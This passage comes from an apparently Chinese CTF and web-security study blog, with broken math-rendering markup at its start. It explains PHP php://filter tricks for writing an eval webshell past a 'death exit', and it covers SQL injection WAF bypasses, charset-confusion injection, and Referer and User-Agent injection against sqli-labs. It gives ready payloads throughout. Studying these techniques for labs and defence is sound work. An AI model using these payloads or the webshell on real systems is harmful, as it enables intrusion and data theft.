class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">制</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span></span></span></span> content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。</p>\n<p>因此我们可以找到两种 base64-decode 相关的绕过</p>\n<p>0x00 通过 base64 编码特性绕过</p>\n<p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 $content 被加上了 <code>&lt;?php exit; ?&gt;</code>  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。</p>\n<p>“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码</p>\n<p>因此我们最终传入的 payload 为：</p>\n<p><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php</code></p>\n<p>在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来</p>\n<p>0x01 利用字符串操作</p>\n<p><code>&lt;?php exit; ?&gt;</code>  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>利用如下 payload，我们便能去除 &lt;&gt; 中的内容  <code>php://filter/read=string.strip_tags/resource=php://input</code></p>\n<p>但问题在于，如果我们去除 &lt;&gt; 会导致我们的一句话木马也被去除。</p>\n<p>但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。</p>\n<p>最终 payload 如下</p>\n<p><code>txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php</code></p>\n<p>filename 中的 string.strip_tags 先把 exit 的 &lt;&gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 <code>&lt;?php eval($_POST[1];?)</code></p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写  less25，26</p>\n<p>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替  Less 26</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<p>6.0x 通过 16 进制逃过</p>\n<h5 id=\"通过编码注入\"><a class=\"markdownIt-Anchor\" href=\"#通过编码注入\">#</a> 通过编码注入</h5>\n<ol>\n<li></li>\n</ol>\n<p>一些 mysql 不认识，但 php 认识的字符，只限制于 post</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_select_db</span>(<span class=\"string\">&#x27;adog&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;set names utf8&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$ps</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;select * from users where id=&#x27;<span class=\"subst\">$id</span>&#x27; and ps=&#x27;<span class=\"subst\">$ps</span>&#x27;&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$id</span> == <span class=\"string\">&#x27;adog&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shabi&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">flag</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"string\">&quot;set names utf-8&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">256</span>;<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"string\">&quot;hehe&quot;</span>.<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `demo` where `name`=`<span class=\"subst\">&#123;$name&#125;</span>`&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"string\">&quot;hehe&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">&#123;$c&#125;</span> &lt;br/&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 <code>Å</code></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Permission denied!&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM z_users where username = &#x27;<span class=\"subst\">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class=\"subst\">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西</p>\n<p>mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 <code>mysql_query(&quot;set names utf-8&quot;);</code>  , <code>set names utf8</code>  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &quot;%character%&quot;;</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                                    |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                                     |</span><br><span class=\"line\">| character_set_connection | utf8                                     |</span><br><span class=\"line\">| character_set_database   | gbk                                      |</span><br><span class=\"line\">| character_set_filesystem | binary                                   |</span><br><span class=\"line\">| character_set_results    | utf8                                     |</span><br><span class=\"line\">| character_set_server     | utf8                                     |</span><br><span class=\"line\">| character_set_system     | utf8                                     |</span><br><span class=\"line\">| character_sets_dir       | D:\\BtSoft\\mysql\\MySQL5.5\\share\\charsets\\ |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">8 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，mysql 字符集为 latin1，而执行了 <code>set names utf8;</code>  以后， <code>character_set_client</code> 、 <code>character_set_connection</code> 、 <code>character_set_results</code>  等与客户端相关的配置字符集都变成了 utf8，但 <code>character_set_database</code> 、 <code>character_set_server</code>  等服务端相关的字符集还是 latin1。</p>\n<p>因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。</p>\n<ol>\n<li>MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；</li>\n<li>进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集</li>\n</ol>\n<p><code>character_set_client</code>  和 <code>character_set_connection</code>  被设置成了 utf8，而 <code>内部操作字符集</code> 其实也就是 <code>username</code>  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>\n<p>最后执行比较 <code>username='admin'</code>  的时候， <code>'admin'</code>  是一个 latin1 字符串。</p>\n<p>因此对于以下 url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:9090/test.php?username=admin%e4</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd%ac</span><br></pre></td></tr></table></figure>\n<p>前两个可以正常查询，但最后一个会产生错误，并且 url 中从 <code>%e4%bd%ac</code>  变为了 <code>佬</code></p>\n<p>在输入 % e4,% e4% bd 时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询</p>\n<p>一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错</p>\n<p>这就是这三个前两个可以正常查询，但第三个报错的原因</p>\n<p>继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能</p>\n<p>比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果</p>\n<blockquote>\n<ol>\n<li>\\x00 <code>~</code> \\x7F`： 返回空白结果</li>\n<li><code>\\x80</code> ~ <code>\\xC1</code> ： 返回错误 Illegal mix of collations</li>\n<li><code>\\xC2</code> ~ <code>\\xEF</code> ： 返回 admin 的结果</li>\n<li><code>\\xF0</code> ~ <code>\\xFF</code> ： 返回错误 Illegal mix of collations</li>\n</ol>\n</blockquote>\n<p>UTF-8 编码是变长编码，可能有 1~4 个字节表示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png\" alt=\"image-20221022172222480\"></p>\n<p>然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg\" alt=\"14917445720884.jpg\"></p>\n<p>所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。</p>\n<p>那么，为什么 <code>username=admin%F0</code>  也不行呢？F0 是在 C2-F4 的范围中呀？</p>\n<p>这又涉及到 Mysql 中另一个特性：<strong>Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节</strong>，</p>\n<p>F0-F4 是四字节才有的，所以我传入 <code>username=admin%F0</code>  也将抛出错误。</p>\n<p>如果你需要 Mysql 支持四字节的 utf-8，可以使用 <code>utf8mb4</code>  编码。我将原始代码中的 set names 改成 <code>set names utf8mb4</code> ，就可以正常查询了</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过</span><br><span class=\"line\">get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了</span><br><span class=\"line\">同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4</span><br><span class=\"line\">utf8mb4是个好东西，还能防宽字节，下面会有详细描述</span><br></pre></td></tr></table></figure>\n<p>参考 p 师傅博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=\">https://www.leavesongs.com</span></p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&#x27;127.0.0.100&#x27;)#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img 